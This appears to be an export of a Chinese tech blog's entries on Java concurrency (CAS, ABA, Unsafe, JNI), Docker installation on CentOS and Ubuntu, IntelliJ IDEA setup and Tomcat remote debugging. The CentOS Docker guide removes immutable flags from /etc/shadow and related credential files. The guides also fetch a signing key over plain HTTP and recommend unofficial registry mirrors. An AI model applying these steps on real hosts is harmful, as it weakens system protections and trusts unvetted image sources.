import com.hots.part2.chapter18.action.ActiveObject;import com.hots.part2.chapter18.action.Result;public class MakerClientThread extends Thread {    private final ActiveObject activeObject;    private final char fillChar;    public MakerClientThread(ActiveObject activeObject, String name) {        super(name);        this.activeObject = activeObject;        this.fillChar = name.charAt(0);    }    @Override    public void run() {        try {            for (int i = 0; true; i++) {                Result result = activeObject.makeString(i + 1, fillChar);                Thread.sleep(20);                String value = (String) result.getResultValue();                System.out.println(Thread.currentThread().getName() + ": value=" + value);            }        } catch (Exception e) {            e.printStackTrace();        }    }}
import com.hots.part2.chapter18.action.ActiveObject;import com.hots.part2.chapter18.action.ActiveObjectFactory;public class Test {    public static void main(String[] args) {        ActiveObject activeObject = ActiveObjectFactory.createActiveObject();        // 制造makeString的请求        new MakerClientThread(activeObject, "Alice").start();        // 制造displayString的请求        new MakerClientThread(activeObject, "Bobby").start();        new DisplayClientThread("Chris", activeObject).start();    }}
Chapter19：Event Bus 中介者模式
Chapter20：Event Driven 事件驱动设计模式
]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>配置Docker环境</title>
    <url>/20221030/8c5d6123.html</url>
    <content><![CDATA[CentOS配置Docker环境
1.  修改docker配置
mkdir /etc/dockervim /etc/docker/daemon.json
添加内容
{    "registry-mirrors": ["https://7ixh250y.mirror.aliyuncs.com"],    "data-root": "/data/docker_mirror"}
查看填写内容
cat /etc/docker/daemon.json

registry-mirrors： 镜像加速
insecure-registries： 私有仓库地址
data-root：docker 数据保存地址，放到盘大的目录防止根目录的盘满

2. 安装docker服务
可选(如果之前有安装，可以选择卸载掉)
#查看已安装的docker包yum list installed | grep docker#卸载已安装的包yum remove xxx  xxx xx
执行命令开始安装docker
#安装依赖  yum install -y yum-utils#添加docker源yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo#查看docker-ce支持版本 yum list docker-ce --showduplicates|sort -r#开启一些权限chattr -i /etc/group &amp;&amp;  chattr -i /etc/passwd &amp;&amp; chattr -i /etc/gshadow &amp;&amp; chattr -i /etc/shadow#开始正式安装docker       yum install -y docker-ce-19.03.9  docker-ce-cli-19.03.9systemctl start docker# 验证：执行docker -v ,如果出现版本号就代表成功了docker -v


开机启动Dockerr服务
  systemctl enable docker.servicesystemctl enable docker.socket


开机启动检查：systemctl list-unit-files | grep docker
  # systemctl list-unit-files | grep dockerdocker.service                             enabled         enabled      docker.socket                              enabled         enabled


说明： 不建议安装最新版本的docker，有可能ranche支持会不好
3. 安装Docker Compose
（1）下载 docker-compose
执行如下命令进行下载
curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
若速度较慢，可以使用如下命令：
curl -L "https://mirror.ghproxy.com/https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
（2）修改目录权限
chmod  x /usr/local/bin/docker-compose
（3）创建软连接
ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
（4）验证安装是否完成
执行如下命令，如果可以正常显示版本号，则表示已经完成
docker-compose --version
Ubuntu 配置Docker环境
1.卸载旧版本Docker
#卸载旧版本dockerapt-get remove docker docker-engine docker-ce docker.io  #清空旧版docker占用的内存apt-get remove --auto-remove docker#更新系统源apt-get update
2.配置安装环境
apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common
3. 添加阿里云的docker GPG密钥
curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | apt-key add -
4. 添加阿里镜像源
add-apt-repository "deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable"#更新apt-get update
5. 查看有哪些版本
apt-cache madison docker-ce

6. 安装最新版/指定版本
#安装最新版apt-get install -y docker-ce#安装5:19.03.6~3-0~ubuntu-bionic版apt-get install -y docker-ce=5:19.03.6~3-0~ubuntu-bionic
7. 重启Docker
service docker restart# 或者systemctl restart docker
8. 查看Docke版本
docker version
9. 配置容器镜像加速器
mkdir /etc/dockervim /etc/docker/daemon.json
添加内容
{    "registry-mirrors": ["https://7ixh250y.mirror.aliyuncs.com"],    "data-root": "/data/docker_mirror"}
查看填写内容
cat /etc/docker/daemon.json

registry-mirrors： 镜像加速
insecure-registries： 私有仓库地址
data-root：docker 数据保存地址，放到盘大的目录防止根目录的盘满

重启 Docker 服务
$ systemctl daemon-reload $ systemctl restart docker
检查设置是否生效
$ docker info$ docker run hello-world
10. 运行hello-world验证docker-ce是否安装成功
docker run --rm hello-world
安装成功显示

11. 安装docker-compose


安装docker-compose
  # 安装pipapt install python3-pip# 更新一下库apt-get update# 更新一下pippip3 install --upgrade pip# 安装docker-composepip3 install docker-compose
如果出错

就更新一下 six
  pip3 install six --user -U


查看docker-compose版本
  docker-compose --version


12. DockerHub国内镜像源列表
此列表只收录无需限定条件的DockerHub镜像源，感谢这些公益服务者。
2024年6月18日 亲测可用



DockerHub镜像仓库
镜像加速器地址




Docker镜像加速站
https://hub.uuuadc.top/



docker.1panel.live



hub.rat.dev


DockerHub 镜像加速代理
https://docker.anyhub.us.kg



https://docker.chenby.cn



https://dockerhub.jobcher.com/


镜像使用说明
https://dockerhub.icu


Docker镜像加速站
https://docker.ckyl.me


镜像使用说明
https://docker.awsl9527.cn


镜像使用说明
https://docker.hpcloud.cloud


AtomHub 可信镜像仓库平台 （只包含基础镜像，共336个）
https://atomhub.openatom.cn


DaoCloud 镜像站
https://docker.m.daocloud.io



使用教程

为了加速镜像拉取，使用以下命令设置registry mirror


支持系统：Ubuntu 16.04+、Debian 8+、CentOS 7+

sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;EOF{    "registry-mirrors": [        "https://hub.uuuadc.top",        "https://docker.anyhub.us.kg",        "https://dockerhub.jobcher.com",        "https://dockerhub.icu",        "https://docker.ckyl.me",        "https://docker.awsl9527.cn"    ]}EOFsudo systemctl daemon-reloadsudo systemctl restart docker

使用DockerHub Proxy，以下以 hub.uuuadc.top 为例：可以根据列表自行替换

docker pull hub.uuuadc.top/library/mysql:5.7
说明：library是一个特殊的命名空间，它代表的是官方镜像。如果是某个用户的镜像就把library替换为镜像的用户名
docker-compose.yml 版本



Compose file format
Docker Engine release




3.8
19.03.0+


3.7
18.06.0+


3.6
18.02.0+


3.5
17.12.0+


3.4
17.09.0+


3.3
17.06.0+


3.2
17.04.0+


3.1
1.13.1+


3
1.13.0+


2.4
17.12.0+


2.3
17.06.0+


2.2
1.13.0+


2.1
1.12.0+


2
1.10.0+


1
1.9.1.+



]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA 使用技巧</title>
    <url>/20221026/2241d802.html</url>
    <content><![CDATA[IDEA：Java项目打包成exe文件
来源：https://blog.csdn.net/zmq836010/article/details/124257340
将Java项目打包成Jar包


打开Idea，点击File》Project Settings



Main Class：选择你项目的main函数所在的类。点击OK



选中Build，点击Build Project，再点击Build Artifacts，点击回车键，即可。
在项目的out\artifacts\Demo_jar目录下，生成了一个Jar文件（可以将Jar文件复制到桌面，方便接下来操作）



下载并安装exe4j.exe文件，将Jar包转成exe可执行文件


启动exe4j，点击Next，后选择“JAR in EXE” mode


点击Next，Output directory 可以选择桌面，选择你想要保存的exe文件的目录





点击Next





点击绿色的加号




点击Next（后面直接点next，不用配置，最后就会生成exe文件）


IDEA添加自定义模板方法


首先，点击File–&gt;Settings–&gt;Editor–&gt;Live Templates



接着，点击右上角“+”添加“Template Group”模板组，如Java


​        ​


在新增的模板组内添加模板，点击右上角“+”添加“Live Template”



填写模板内容，定义出发快捷键选择 Enter


​        


定义作用域

这样就OK了，可以仿照这种方式，自定义很多快捷输入的语句，比如输入，输出等：



IDEA 针对Terminal更新环境变量

修改shell path 调用的程序



Git 环境变量



在IDEA中的命令行终端中输入bash 即可调用git bash ，使用结束后输入exit退出

IDEA 开启RunDashboard
修改 .idea/workspace.xml 文件

找到&lt;component name="RunDashboard"&gt; 添加配置：&lt;option name="configurationTypes"&gt;   &lt;set&gt;     &lt;option value="SpringBootApplicationConfigurationType" /&gt;   &lt;/set&gt; &lt;/option&gt;
最终配置：

显示效果：

IDEA 配置Git忽略提交文件


点击File-&gt;Settings-&gt;Plugins，点击Browse repositories…



搜索**.ignore**，点击Install，安装完成后，重启IDEA


在 项目上 右键-&gt;New -&gt;.ignore file -&gt;.gitignore file(Git)



先选择Example user template好了，以后有什么想过滤的可以自行添加，~最后点击Generate生成



然后就会发现被忽略的文件名变成了灰色


也可以右键文件将其加入忽略的名单中



以下是一些.gitignore文件忽略的匹配规则：



通配符
说明




.a
忽略所有 .a 结尾的文件


!lib.a
但 lib.a 除外


/TODO
仅仅忽略项目根目录下的 TODO 文件，不包括 subdir/TODO


build/
忽略 build/ 目录下的所有文件


doc/.txt
会忽略 doc/notes.txt 但不包括 doc/server/arch.txt





注意
.gitignore只能忽略那些原来没有被track的文件，如果某些文件已经被纳入了版本管理中，则修改.gitignore是无效的。
那么解决方法就是先把本地缓存删除（改变成未track状态），然后再提交：
 输入：git rm -r –cached filePathgit commit -m “remove xx”或者：git rm -r –cached .git add .git commit -m “update .gitignore”来解释下几个参数-r 是删除文件夹及其子目录–cached 是删除暂存区里的文件而不删除工作区里的文件，第一种是删除某个文件，第二种方法就把所有暂存区里的文件删了，再加一遍，相当于更新了一遍。


IDEA 配置SpringBoot热部署


导入devtools依赖即可
&lt;dependency&gt;   &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;   &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;   &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt;


然后到setting框中，输入compiler，然后勾选**Build project automatically**


然后按住shift+alt+ctrl+/，进入**maintenance,然后选择进入Registry**


勾选**compiler.automake.when.app.running**


IDEA 针对Terminal更新环境变量

目的： Terminal 终端直接使用GitBash，IDEA默认使用的是cmd

打开Terminal 的Settings， 可以看到 默认的shell path

方法一：修改默认的schell path

方法二：将git的bash.exe配置到操作系统环境变量path中

此时，在Terminal中 输入 bash  直接打开 git bash
远程调试 TOMCAT
TOMCAT服务器配置


方式一：官方推荐
在catalina.sh文件的文件头加上如下配置项即可。其中address=8000的端口号8000 自定义
export JAVA_OPTS='-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000'


方式二：
修改catalina.sh  的 JPDA_ADDRESS
修改前：

修改后：



本地IDEA配置
IDEA 版本号：2022.3


方式一：Remote JVM Debug


工具栏：Run-&gt; Edit Configurations , 添加 Remote JVM Debug



配置远程服务器IP和DEBUG端口，以及选择本地项目
 


本地DEBUG启动,启动成功之后，控制台会输出相应链接成功日志





方式二：Tomcat Remote 模式


添加Tomcat Server 配置



配置远程服务器IP和应用端口
 c.


配置远程服务器DEBUG端口



debug 启动

服务器监听：





]]></content>
      <categories>
        <category>工具|部署</category>
        <category>IDEA</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA插件</title>
    <url>/20221026/ee604b16.html</url>
    <content><![CDATA[CamelCase
使用快捷键转换驼峰、下划线等命名规则

光标放在要修改的名称上（如：变量名，或者mapper.xml里的字段名,会自动识别光标所在单词），按control+alt+U,则进行按命名规则进行转换，会按配置中选择的命名规则列表来回切换。
如图，如果只选择了CamelCase to camelCase、camelCase to snake_case，则可以在两者之间来回切换，适合公司对命名的要求。

RestfulToolkit
 

Free Mybatis plugin

EasyCode
代码生成插件


下载插件，安装后重启



在idea右侧选择Database，选择自己的数据库



输入账号密码，连接成功



选择自己所需的表，鼠标右键-&gt;EasyCode-&gt;Generate Code



选择自己需要生成的，勾选，然后OK就行



系统自己生成了entity包，以及实体类。



MybatisLog

]]></content>
      <categories>
        <category>工具|部署</category>
        <category>IDEA</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA配置</title>
    <url>/20221026/1a8c2722.html</url>
    <content><![CDATA[编码配置
全局编码

文件编码
打开需要设置编码的文件，在右下角进行设置
编码统一
File Encodings

文件默认打开方式

如上图标注 1 所示，该区域的后缀类型文件在 IntelliJ IDEA 中将以标注 2 的方式进行打开。
如上图标注 3 所示，我们可以在 IntelliJ IDEA 中忽略某些后缀的文件或是文件夹，比如我一般会把 .idea 这个文件夹忽略。
字体设置
界面字体
Settings-&gt;Appearance

程序字体
Editor -&gt; Colors &amp; Fonts -&gt; Font

代码注释
修改类注释模板
File-&gt;Settings-&gt;File and Code Templates 找到Includes
单行注释、注释块
搜索：Add a space at line comment start

代码提示
代码提示快捷键（Ctrl+逗号）
如图所示，默认 Ctrl + 空格 快捷键是基础代码提示、补充快捷键，但是由于我们中文系统基本这个快捷键都被输入法占用了，
所以我们发现不管怎么按都是没有提示代码效果的，原因就是在此。我个人建议修改此快捷键为 Ctrl + 逗号。

鼠标放上去提示参数

代码格式化
格式化代码后，多行空行转为一行
idea格式化代码后会出现最多2行空行，不能像eclipse一样最多只保留一行空行，要想设置的和eclipse效果一样，设置如下
File --&gt; setting --&gt; 搜索 code style --&gt; 选择 blank lines标签项 --&gt; 保留最大空行数设置为1

代码查看窗口
软分行查看代码
右键

文件打开列表超过一行，放多行显示

如上图标注 1 所示，在打开很多文件的时候，IntelliJ IDEA 默认是把所有打开的文件名 Tab 单行显示的。可以修改为多行
默认代码展示形式（折叠/展开）
我们可以对指定代码类型进行默认折叠或是展开的设置，勾选上的表示该类型的代码在文件被打开的时候默认是被折叠的，去掉勾选则反之。

行号和方法分割线
默认 IntelliJ IDEA 是没有勾选 Show line numbers 显示行数的，但是我建议一般这个要勾选上。
默认 IntelliJ IDEA 是没有勾选 Show method separators 显示方法线的，这种线有助于我们区分开方法，所以也是建议勾选上的。

增加打开的文件 Tab 个数
Tab limit

单文件多窗口打开

默认隐藏注释

]]></content>
      <categories>
        <category>工具|部署</category>
        <category>IDEA</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>压测工具概述</title>
    <url>/20221030/e291c7ca.html</url>
    <content><![CDATA[JMeter
Java 微基准测试（JMH）
AB (Apache Benchmark)
几种性能测试工具的总结 - Thoughtworks洞见：https://insights.thoughtworks.cn/performance-testing-tools/
]]></content>
      <categories>
        <category>工具|部署</category>
        <category>压测</category>
      </categories>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Java并发包</title>
    <url>/20221101/3c508c34.html</url>
    <content><![CDATA[Atomic包
CAS(Compare And Swap)：比较并交换
CAS即Compare And Swap的缩写，翻译成中文就是比较并交换，其作用是让CPU比较内存中某个值是否和预期的值相同，如果相同则将这个值更新为新值，不相同则不做更新，也就是CAS是原子性的操作(读和写两者同时具有原子性)，其实现方式是通过借助C/C++调用CPU指令完成的，所以效率很高。(使用的是最快失败策略)
CAS的原理很简单，这里使用一段Java代码来描述
public boolean compareAndSwap(int value, int expect, int update) {    // 如果内存中的值value和期望值expect一样 则将值更新为新值update    if (value == expect) {        value = update;        return true;    } else {        return false;    }}
大致过程是将内存中的值、我们的期望值、新值交给CPU进行运算，如果内存中的值和我们的期望值相同则将值更新为新值，否则不做任何操作。这个过程是在CPU中完成的，这里不好描述CPU的工作过程，就拿Java代码来描述了。
Unsafe源码分析
​    Java是在Unsafe(sun.misc.Unsafe)类实现CAS的操作，而我们知道Java是无法直接访问操作系统底层的API的（原因是Java的跨平台性限制了Java不能和操作系统耦合），所以Java并没有在Unsafe类直接实现CAS的操作，而是通过**JDI(Java Native Interface)**本地调用C/C++语言来实现CAS操作的。
Unsafe有很多个CAS操作的相关方法，这里举例几个
public final native boolean compareAndSwapObject(Object var1, long var2, Object var4, Object var5);public final native boolean compareAndSwapInt(Object var1, long var2, int var4, int var5);public final native boolean compareAndSwapLong(Object var1, long var2, long var4, long var6);
我们拿public final native boolean compareAndSwapInt(Object var1, long var2, int var4, int var5);进行分析
这个方法是比较内存中的一个值（整型）和我们的期望值（var4）是否一样，如果一样则将内存中的这个值更新为var5，参数中的var1是值所在的对象，var2是值在对象(var1)中的内存偏移量，参数var1和参数var2是为了定位出值所在内存的地址。

Unsafe.java在这里发挥的作用有：

将对象引用、值在对象中的偏移量、期望的值和欲更新的新值传递给Unsafe.cpp
如果值更新成功则返回true给开发者，没有更新则返回false

Unsafe.cpp在这里发挥的作用有：

接受从Unsafe传递过来的对象引用、偏移量、期望的值和欲更新的新值，根据对象引用和偏移量计算出值的地址，然后将值的地址、期望的值、欲更新的新值传递给CPU
如果值更新成功则返回true给Unsafe.java，没有更新则返回false

CPU在这里发挥的作用：

接受从Unsafe.cpp传递过来的地址、期望的值和欲更新的新值，执行指令cmpxchg，比较地址中的值是否和期望的值一样，一样则将值更新为新的值，不一样则不做任何操作
将操作结果返回给Unsafe.cpp

CAS的缺点：ABA
ABA说明

在多线程场景下CAS会出现ABA问题，关于ABA问题这里简单科普下，例如有2个线程同时对同一个值(初始值为A)进行CAS操作，这三个线程如下

线程1，期望值为A，欲更新的值为B
线程2，期望值为A，欲更新的值为B
线程3，期望值为B，欲更新的值为A

线程1抢先获得CPU时间片，而线程2因为其他原因阻塞了；线程1取值与期望的A值比较，发现相等然后将值更新为B；
这个时候出现了线程3，线程3取值与期望的值B比较，发现相等则将值更新为A；
此时线程2从阻塞中恢复，并且获得了CPU时间片，这时候线程2取值与期望的值A比较，发现相等则将值更新为B
虽然线程2也完成了操作，但是线程2并不知道值已经经过了A-&gt;B-&gt;A的变化过程。

ABA问题带来的危害

小明在提款机，提取了50元，因为提款机问题，有两个线程，同时把余额从100变为50


线程1（提款机）：获取当前值100，期望更新为50，


线程2（提款机）：获取当前值100，期望更新为50，


线程1成功执行，线程2某种原因block了，这时，某人给小明汇款50

线程3（某人）：获取当前值50，期望更新为100，

这时候线程3成功执行，余额变为100，
线程2从Block中恢复，获取到的也是100，compare之后，继续更新余额为50
此时可以看到，实际余额应该为100（100-50+50），但是实际上变为了50（100-50+50-50）这就是ABA问题带来的成功提交。

@Testpublic void testAtomicReference() throws InterruptedException {  final Integer moneyTotal = 100;  AtomicInteger money = new AtomicInteger(moneyTotal);  Thread t1 = new Thread(() -&gt; {    money.getAndAdd(-50);    System.out.printf(Thread.currentThread().getName() + "-更新成功（%d-&gt;%d）.\n", moneyTotal, money.get());  });  t1.start();  Thread t2 = new Thread(() -&gt; {    try {      TimeUnit.SECONDS.sleep(2);    } catch (InterruptedException e) {      e.printStackTrace();    }    money.getAndAdd(-50);    System.out.printf(Thread.currentThread().getName() + "-更新成功（%d-&gt;%d）.\n", moneyTotal, money.get());  });  t2.start();  Thread t3 = new Thread(() -&gt; {    money.getAndAdd(50);    System.out.printf(Thread.currentThread().getName() + "-更新成功（%d-&gt;%d）.\n", moneyTotal, money.get());  });  t3.start();  t1.join();  t2.join();  t3.join();  // 输出50，钱数错误  System.out.println(money.get());}输出：Thread-0-更新成功（100-&gt;50）.Thread-2-更新成功（100-&gt;100）.Thread-1-更新成功（100-&gt;50）.50
ABA问题解决：AtomicStampedReference
解决方法： 在变量前面加上版本号（int），每次变量更新的时候变量的版本号都+1，即A-&gt;B-&gt;A就变成了1A-&gt;2B-&gt;3A。
@Testpublic void testAtomicStampedReference() throws InterruptedException {    final AtomicInteger stamp = new AtomicInteger();    final Integer moneyTotal = 100;    AtomicStampedReference money = new AtomicStampedReference(moneyTotal, 0);    // step1：取款50    final Integer moneyStep1 = moneyTotal - 50;    Thread t1 = new Thread(() -&gt; {        if (money.compareAndSet(moneyTotal, moneyStep1, stamp.get(), stamp.incrementAndGet())) {            System.out.printf(Thread.currentThread().getName() + "-更新成功（%d-&gt;%d）:%d.\n", moneyTotal,                              money.getReference(), money.getStamp());        } else {            System.out.printf(Thread.currentThread().getName() + "-更新失败（%d-&gt;%d）:%d.\n", moneyTotal,                              money.getReference(), money.getStamp());        }    }, "T1");    t1.start();    Thread t2 = new Thread(() -&gt; {        TaskFactory.spend(2, TimeUnit.SECONDS);        if (money.compareAndSet(moneyTotal, moneyStep1, stamp.get(), stamp.incrementAndGet())) {            System.out.printf(Thread.currentThread().getName() + "-更新成功（%d-&gt;%d）:%d.\n", moneyTotal,                              money.getReference(), money.getStamp());        } else {            System.out.printf(Thread.currentThread().getName() + "-更新失败（%d-&gt;%d）:%d.\n", moneyTotal,                              money.getReference(), money.getStamp());        }    }, "T2");    t2.start();    // step2. 他人转入50    final Integer moneyStep2 = moneyStep1 + 50;    Thread t3 = new Thread(() -&gt; {        if (money.compareAndSet(moneyStep1, moneyStep2, 1, 2)) {            System.out.printf(Thread.currentThread().getName() + "-更新成功（%d-&gt;%d）:%d.\n", moneyTotal,                              money.getReference(), money.getStamp());        } else {            System.out.printf(Thread.currentThread().getName() + "-更新成功（%d-&gt;%d）:%d.\n", moneyTotal,                              money.getReference(), money.getStamp());        }    }, "T3");    t3.start();    t1.join();    t2.join();    t3.join();    System.out.printf(Thread.currentThread().getName() + "-最终（%d）:%d.\n", money.getReference(), money.getStamp());}输出T1-更新成功（100-&gt;50）:1.T3-更新成功（100-&gt;100）:2.T2-更新失败（100-&gt;100）:2.main-最终（100）:2.
CAS的缺点：循环时间长开销大
如果CAS操作失败，就需要循环进行CAS操作(循环同时将期望值更新为最新的)，如果长时间都不成功的话，那么会造成CPU极大的开销。

这种循环也称为自旋

解决方法： 限制自旋次数，防止进入死循环。
CAS的缺点：只能保证一个共享变量的原子操作
CAS的原子操作只能针对一个共享变量。
解决方法： 如果需要对多个共享变量进行操作，可以使用加锁方式(悲观锁)保证原子性，或者可以把多个共享变量合并成一个共享变量进行CAS操作。
CAS的应用
我们知道CAS操作并不会锁住共享变量，也就是一种非阻塞的同步机制，CAS就是乐观锁的实现。

乐观锁总是假设最好的情况，每次去操作数据都认为不会被别的线程修改数据，所以在每次操作数据的时候都不会给数据加锁，即在线程对数据进行操作的时候，别的线程不会阻塞仍然可以对数据进行操作，只有在需要更新数据的时候才会去判断数据是否被别的线程修改过，如果数据被修改过则会拒绝操作并且返回错误信息给用户。
悲观锁总是假设最坏的情况，每次去操作数据时候都认为会被的线程修改数据，所以在每次操作数据的时候都会给数据加锁，让别的线程无法操作这个数据，别的线程会一直阻塞直到获取到这个数据的锁。这样的话就会影响效率，比如当有个线程发生一个很耗时的操作的时候，别的线程只是想获取这个数据的值而已都要等待很久。

Java利用CAS的乐观锁、原子性的特性高效解决了多线程的安全性问题，例如JDK1.8中的集合类ConcurrentHashMap、关键字volatile、ReentrantLock等。
AtomicLong


区别于AtomicInteger：VM_SUPPORTS_LONG_CAS：虚拟机是否支持 CAS 操作
/** * Records whether the underlying JVM supports lockless * compareAndSwap for longs. While the Unsafe.compareAndSwapLong * method works in either case, some constructions should be * handled at Java level to avoid locking user-visible locks. */static final boolean VM_SUPPORTS_LONG_CAS = VMSupportsCS8();  /** * Returns whether underlying JVM supports lockless CompareAndSet * for longs. Called only once and cached in VM_SUPPORTS_LONG_CAS. */private static native boolean VMSupportsCS8();


AtomicReference
reference的地址为int类型
AtomicXXXFieldUpdater
使用AtomicXXXFieldUpdater的原因：


想让类的操作属性具备原子性的条件

类的属性是volatile（ Must be volatile type）
==非当前类调用，则非private、protected==
类型必须一致



不想使用锁（包括显示锁、重量级锁Synchronized）


大量需要原子类型修饰的对象，比较消耗资源


public class AtomicIntegerFieldUpdaterTest {    @Test    public void test() {        AtomicIntegerFieldUpdater&lt;TestBean&gt; updater = AtomicIntegerFieldUpdater.newUpdater(TestBean.class, "param");        TestBean test = new TestBean();        updater.incrementAndGet(test);        System.out.println(updater.get(test));    }    class TestBean {        // 非本类调用，param 不可设置未private、protected        volatile int param;    }}
Unsafe
​	 java 调用C++/C 再 调用汇编
几种Counter方案的性能对比。
import sun.misc.Unsafe;import java.lang.reflect.Field;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.TimeUnit;import java.util.concurrent.atomic.AtomicInteger;import java.util.concurrent.locks.Lock;import java.util.concurrent.locks.ReentrantLock;import java.util.function.Consumer;public class UnsafeTest {    private static final int THREAD_COUNT = 1000;    private static final int MAX_NUM = 10000;    public static void main(String[] args) {        doAction(getAction(), new VolatileCounter(), "Volatile");        doAction(getAction(), new AtomicCounter(), "Executors");        doAction(getAction(), new SynCounter(), "Sync");        doAction(getAction(), new LockCounter(), "Lock");        doAction(getAction(), new CasCounter(), "Cas");    }    private static Consumer&lt;Counter&gt; getAction() {        Consumer&lt;Counter&gt; action = param -&gt; {            ExecutorService executorService = Executors.newFixedThreadPool(THREAD_COUNT);            for (int i = 0; i &lt; THREAD_COUNT; i++) {                executorService.submit(new CounterRunnable(param, MAX_NUM));            }            executorService.shutdown();            try {                // 不可省略，需要等待执行线程运行结束                // 一般情况下awaitTermination和shutdown配合使用，shutdown之后调用awaitTermination                // 如果注释掉shutdown方法，则awaitTermination不会监视到线程池关闭的信息 所以在这个地方代码会堵塞，                // 如果注释掉awaitTermination方法，则后面的代码不会得到线程执行过的结果                executorService.awaitTermination(1, TimeUnit.HOURS);            } catch (InterruptedException e) {                e.printStackTrace();            }        };        return action;    }    /**     * 统计运行时长     *     * @param action     * @param counter     */    private static void doAction(Consumer&lt;Counter&gt; action, Counter counter, String tag) {        long begin = System.currentTimeMillis();        // 任务执行        action.accept(counter);        long end = System.currentTimeMillis();        System.out.println(tag + " counter result: " + counter.getCounter() + " and time passed in ms: " + (end - begin));    }    interface Counter {        void increment();        long getCounter();    }    static class VolatileCounter implements Counter {        private volatile int counter;        @Override        public void increment() {            ++counter;        }        @Override        public long getCounter() {            return counter;        }    }    static class AtomicCounter implements Counter {        private AtomicInteger counter = new AtomicInteger(0);        @Override        public void increment() {            counter.incrementAndGet();        }        @Override        public long getCounter() {            return counter.get();        }    }    static class SynCounter implements Counter {        private int counter = 0;        @Override        public synchronized void increment() {            ++counter;        }        @Override        public long getCounter() {            return counter;        }    }    static class LockCounter implements Counter {        private int counter = 0;        private Lock lock = new ReentrantLock();        @Override        public void increment() {            try {                lock.lock();                ++counter;            } finally {                lock.unlock();            }        }        @Override        public long getCounter() {            return counter;        }    }    static class CasCounter implements Counter {        private int counter = 0;        private static final Unsafe unsafe = getUnsafe();        private static final long valueOffset;        static {            try {                valueOffset = unsafe.objectFieldOffset(CasCounter.class.getDeclaredField("counter"));            } catch (Exception ex) {                throw new Error(ex);            }        }        @Override        public void increment() {            int expect = counter;            while (!unsafe.compareAndSwapInt(this, valueOffset, expect, expect + 1)) {                expect = counter;            }        }        @Override        public long getCounter() {            return counter;        }        private static Unsafe getUnsafe() {            try {                Field unsafe = Unsafe.class.getDeclaredField("theUnsafe");                unsafe.setAccessible(true);                return (Unsafe) unsafe.get(null);            } catch (Exception e) {                throw new RuntimeException(e);            }        }    }    static class CounterRunnable implements Runnable {        private final Counter counter;        private final int num;        CounterRunnable(Counter counter, int num) {            this.counter = counter;            this.num = num;        }        @Override        public void run() {            synchronized (counter) {                for (int i = 0; i &lt; num; i++) {                    counter.increment();                }            }        }    }}
执行结果
Volatile counter result: 10000000 and time passed in ms: 177Executors counter result: 10000000 and time passed in ms: 183Sync counter result: 10000000 and time passed in ms: 1111Lock counter result: 10000000 and time passed in ms: 204Cas counter result: 10000000 and time passed in ms: 114
Java 调用 C 流程（JNI ）


创建目录jni


创建文件Hello.java
public class Hello{	static{		// 加载动态链接库		System.loadLibrary("hello");	}		// 本地方法	public native void hi();		public static void main(String[] args){		new Hello().hi();	}}


编译Java文件javac Hello.java



使用命令javah -jni Hello生成头文件Hello.h（C的header文件）

Hello.h内容如下
/* DO NOT EDIT THIS FILE - it is machine generated */#include &lt;jni.h&gt;/* Header for class Hello */#ifndef _Included_Hello#define _Included_Hello#ifdef __cplusplusextern "C" {#endif/* * Class:     Hello * Method:    hi * Signature: ()V */JNIEXPORT void JNICALL Java_Hello_hi  (JNIEnv *, jobject);#ifdef __cplusplus}#endif#endif


编写C程序：Hello.c，也就是上面header文件中方法的实现
#include &lt;jni.h&gt;#include "Hello.h"JNIEXPORT void JNICALL Java_Hello_hi (JNIEnv * env, jobject o){	printf("Say hi.\n");};


查看ls -l $JAVA_HOME/include


编译C文件gcc -fPIC  -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/linux" -c Hello.c，生成了Hello.o的目标文件


生成"hello" 的动态链接库 gcc -shared Hello.o -o libhello.so， 生成了libhello.so（lib 是linux约定俗成的前缀）


运行java文件：java Hello，报错
Exception in thread "main" java.lang.UnsatisfiedLinkError: no hello in java.library.path	at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1867)	at java.lang.Runtime.loadLibrary0(Runtime.java:870)	at java.lang.System.loadLibrary(System.java:1122)	at Hello.&lt;clinit&gt;(Hello.java:4)


配置java.library.path. 临时生效：export LD_LIBRARY_PATH=.



重新运行：java Hello



底层汇编相关指令

compareAndSwapInt -&gt; cmpxchg1
compareAndSwapLong -&gt; cmpxchg
putOrderedInt -&gt; xchg1
compareAndSwapObject -&gt; cmpxchgq

CountDownLatch
A synchronization aid that allows one or more threads to wait until a set of operations being performed in other threads completes.“允许一个或多个线程等待，直到在其他线程中执行的一组操作完成”的同步算法
退出条件

countDown() 减到0：await()
等待时间到了截止时间：await(long timeout, TimeUnit unit)

使用场景
等待所有线程执行完成
